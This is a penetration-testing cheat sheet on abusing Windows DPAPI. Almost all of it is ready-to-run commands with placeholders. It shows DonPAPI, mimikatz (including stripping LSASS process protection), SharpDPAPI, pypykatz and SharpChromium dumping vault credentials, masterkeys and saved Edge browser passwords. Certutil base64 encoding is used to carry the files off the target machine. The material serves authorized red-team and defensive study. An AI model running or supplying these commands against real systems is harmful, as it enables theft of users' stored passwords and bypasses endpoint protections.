---
title: "DPAPI"
date: 2024-7-31
tags: ["DPAPI", "enum", "Windows", "password", "credentials", "DonPAPI"]
---

### Abuse #1: Auto dump (From Linux)

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
DonPAPI collect -d <DOMAIN> -u <USER> -p '<PASSWORD>' -t <TARGET>
```

<small>*Ref: [DonPAPI](https://github.com/login-securite/DonPAPI)*</small>

{{< /tabcontent >}}

### Abuse #1: Auto dump (From Windows)

{{< tab set2 tab1 active >}}mimikatz{{< /tab >}}
{{< tab set2 tab2 >}}SharpDPAPI{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Info Gathering

```console
cmd /c "dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Vault & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Credentials & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Protect & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Vault & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Protect"
```

#### 2. Secrets Dump

```console
mimikatz.exe "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "dpapi::cred /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials\<CREDENTIALS_HASH>"' '"dpapi::masterkey /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Protect\<SID>\<PROTECT_HASH> /sid:<SID> /password:<PASSWORD> /protected"' '"dpapi::cred /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials\<CREDENTIALS_HASH>"' "exit"
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console
# Run as system
.\SharpDPAPI.exe machinetriage
```

```console
# Run as user
.\SharpDPAPI.exe credentials /password:'<PASSWORD>'
```

{{< /tabcontent >}}

---

### Abuse #2: Browser Saved Creds

{{< tab set3 tab1 active >}}Manual{{< /tab >}}
{{< tab set3 tab2 >}}Auto{{< /tab >}}
{{< tabcontent set3 tab1 >}}

#### 1. Prepare logindata and localstate file

```console
# Get Local State json file, copy and paste to local Linux
type "C:\Users\<USER>\appdata\local\microsoft\edge\User Data\Local State"
```

```console
# Get Login Data binary file
certutil -encode "C:\Users\<USER>\appdata\local\microsoft\edge\User Data\Default\Login Data" C:\ProgramData\logindata
```

```console
# Copy and paste to local Linux
type C:\ProgramData\logindata
```

```console
# Base64 decode
cat logindata_b64 | base64 -d > logindata
```

```console
# Extract key from local state
cat localstate | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- > blob
```

```console
# Get masterkey_guid
pypykatz dpapi describe blob blob
```

<small>*Ref: [pypykatz](https://github.com/skelsec/pypykatz)*</small>

#### 2. Retrieve Keys

```console
# Get master key
certutil -encode "C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\<MASTERKEY_GUID>" C:\ProgramData\<MASTERKEY_GUID>
```

```console
# Copy and paste to local Linux
type C:\ProgramData\<MASTERKEY_GUID>
```

```console
# Base64 decode
cat masterkey_guid_b64 | base64 -d > masterkey_guid
```

#### 3. Decrypt

```console
pypykatz dpapi prekey password <SID> <USER_PASSWORD> | tee pkf
```

```console
pypykatz dpapi masterkey <MASTERKEY_GUID_FILE> pkf -o mkf
```

```console
pypykatz dpapi chrome --logindata logindata mkf localstate
```

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

```console
.\SharpChromium.exe logins
```

<small>*Ref: [SharpChromium.exe](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpChromium.exe)*</small>

{{< /tabcontent >}}

---

### Abuse #3: Decrpyt Masterkey without password

{{< tab set4 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set4 tab1 >}}

```console
# Take note of the last key
.\mimikatz.exe "dpapi::masterkey /in:C:\users\<USER>\appdata\roaming\microsoft\protect\<SID>\<MASTERKEY_GUID> /rpc" exit
```

```console
# Decrypt
.\mimikatz.exe "dpapi::cred /in:C:\users\<USER>\appdata\roaming\microsoft\protect\<SID>\<MASTERKEY_GUID> /masterkey:<KEY>" exit
```

{{< /tabcontent >}}
